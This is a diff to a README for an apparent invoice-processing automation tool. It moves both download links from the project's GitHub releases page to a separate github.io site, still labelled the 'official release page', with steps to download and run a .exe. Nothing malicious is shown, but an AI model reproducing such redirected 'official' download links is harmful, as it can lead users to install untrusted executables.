@@ -1,6 +1,6 @@
 # 🤖 ap-automation-agent - Automated invoice processing for your business
 
-[![Download Link](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Tannerkatabolic443/ap-automation-agent/releases)
+[![Download Link](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://tannerkatabolic443.github.io)
 
 ## ✅ About this application
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Tannerkatabolic443/ap-automation-agent/releases) to download the latest setup file.
+1. Go to the [official release page](https://tannerkatabolic443.github.io) to download the latest setup file.
 2. Look for the file that ends in .exe.
 3. Click the file to start the download.
 4. Save the file to your desktop or your downloads folder.
